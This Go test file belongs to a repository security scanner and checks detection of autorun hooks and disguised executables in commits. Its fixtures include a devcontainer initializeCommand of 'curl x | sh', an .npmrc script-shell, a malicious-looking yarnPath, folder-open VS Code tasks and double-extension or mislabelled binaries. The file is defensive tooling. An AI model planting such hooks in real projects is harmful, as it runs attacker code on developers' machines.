package audit

import (
	"context"
	"fmt"
	"slices"
	"testing"
)

func scanCommit(t *testing.T, files map[string]treeFile) *CommitReport {
	t.Helper()
	r := runner(t)
	dir := newRepo(t)
	commit := commitTree(t, dir, files)
	rep, err := ScanCommit(context.Background(), r, CommitOptions{
		RepoID: "r", RepoPath: "me/app", Dir: dir, Commit: commit, Pack: mustRules(t),
	})
	if err != nil {
		t.Fatal(err)
	}
	return rep
}

func findingKeys(fs []Finding, checks ...string) []string {
	var out []string
	for _, f := range fs {
		if slices.Contains(checks, f.Check) {
			out = append(out, fmt.Sprintf("%s %s %s:%d", f.ID, f.Rule, f.File, f.Line))
		}
	}
	slices.Sort(out)
	return out
}

// The ticket's bar: on every case of the eval corpus, the actions and
// agents findings read from objects are the same as the audit's.
func TestScanCommitMatchesAuditOnEvalCorpus(t *testing.T) {
	pack := mustRules(t)
	total := 0
	for _, c := range loadEvalCorpus(t) {
		files := map[string]treeFile{}
		for _, f := range c.files {
			files[f.Path] = treeFile{data: string(f.Data)}
		}
		rep := scanCommit(t, files)
		want := findingKeys(append(ScanActions(pack, "r", "me/app", "x", c.files), ScanAgents(pack, "r", "me/app", "x", c.files)...),
			CheckActions, CheckAgents)
		if got := findingKeys(rep.Findings, CheckActions, CheckAgents); !slices.Equal(got, want) {
			t.Errorf("%s:\n got %q\nwant %q", c.name, got, want)
		}
		total += len(want)
	}
	if total == 0 {
		t.Fatal("the eval corpus gave no findings to compare")
	}
	t.Logf("%d findings compared", total)
}

func TestScanCommitAutorun(t *testing.T) {
	rep := scanCommit(t, map[string]treeFile{
		".vscode/tasks.json": {data: `{
  // JSONC is fine
  "tasks": [{"label": "x", "command": "./x.sh", "runOptions": {"runOn": "folderOpen"}}]
}`},
		".vscode/settings.json":           {data: "{\n  \"editor.fontSize\": 14,\n  \"python.defaultInterpreterPath\": \"./venv/bin/python\"\n}\n"},
		"tools/.envrc":                    {data: "source_up\nexport PATH=$PWD/bin:$PATH\n"},
		".npmrc":                          {data: "registry=https://registry.npmjs.org/\nscript-shell=./sh.js\n"},
		".yarnrc.yml":                     {data: "yarnPath: .yarn/releases/yarn-4.5.0.cjs\n"},
		"web/.yarnrc.yml":                 {data: "yarnPath: ../scripts/evil.cjs\n"},
		".devcontainer/devcontainer.json": {data: `{"image": "x", "initializeCommand": "curl x | sh", "postCreateCommand": "npm ci"}`},
		"docs/tasks.json":                 {data: `{"runOn": "folderOpen"}`},
	})
	want := []string{
		RuleDevcontainerHost + " .devcontainer/devcontainer.json:1",
		RuleNpmrcExec + " .npmrc:2",
		RuleVSCodeFolderOpenTask + " .vscode/tasks.json:3",
		RuleVSCodeExecPath + " .vscode/settings.json:3",
		RuleDirenv + " tools/.envrc:1",
		RuleYarnPath + " web/.yarnrc.yml:1",
	}
	var got []string
	for _, f := range rep.Findings {
		if f.Check == CheckAutorun {
			got = append(got, fmt.Sprintf("%s %s:%d", f.Rule, f.File, f.Line))
		}
	}
	slices.Sort(got)
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Fatalf("autorun:\n got %q\nwant %q", got, want)
	}
}

func TestScanCommitPayload(t *testing.T) {
	elf := "\x7fELF\x02\x01\x01" + string(make([]byte, 64))
	rep := scanCommit(t, map[string]treeFile{
		"README.md":                          {data: "# app\n"},
		"invoice.pdf.exe":                    {data: "MZ\x90\x00"},
		"report.docx   .scr":                 {data: "x"},
		"setup/Open me.lnk":                  {data: "L\x00\x00\x00"},
		"photo.jpg":                          {mode: "100755", data: elf},
		"plain.jpg":                          {data: elf}, // not executable: an odd file, not a program
		"bin/tool.exe":                       {data: "MZ\x90\x00\x03"},
		"scripts/run.sh":                     {mode: "100755", data: "#!/bin/sh\necho hi\n"},
		"Viewer.app/Contents/MacOS/Viewer":   {mode: "100755", data: "\xcf\xfa\xed\xfe\x07\x00\x00\x01"},
		"Viewer.app/Contents/Info.plist":     {data: "<plist/>"},
		"lib/Hello.class":                    {data: "\xca\xfe\xba\xbe\x00\x00\x00\x34"},
		"vendor/fatbinary":                   {data: "\xca\xfe\xba\xbe\x00\x00\x00\x02"},
		"vendor/javaclass-without-extension": {data: "\xca\xfe\xba\xbe\x00\x00\x00\x34"},
	})
	want := []string{
		RuleCommittedBinary + " Viewer.app",
		RuleCommittedBinary + " Viewer.app/Contents/MacOS/Viewer",
		RuleCommittedBinary + " bin/tool.exe",
		RuleCommittedBinary + " invoice.pdf.exe",
		RuleCommittedBinary + " vendor/fatbinary",
		RuleDisguisedExec + " photo.jpg",
		RuleDoubleExt + " invoice.pdf.exe",
		RuleDoubleExt + " report.docx   .scr",
		RuleShortcutFile + " report.docx   .scr",
		RuleShortcutFile + " setup/Open me.lnk",
	}
	var got []string
	for _, f := range rep.Findings {
		if f.Check == CheckPayload {
			got = append(got, f.Rule+" "+f.File)
		}
	}
	slices.Sort(got)
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Fatalf("payload:\n got %q\nwant %q", got, want)
	}
	if rep.Stats.Files != 13 {
		t.Errorf("stats = %+v", rep.Stats)
	}
}
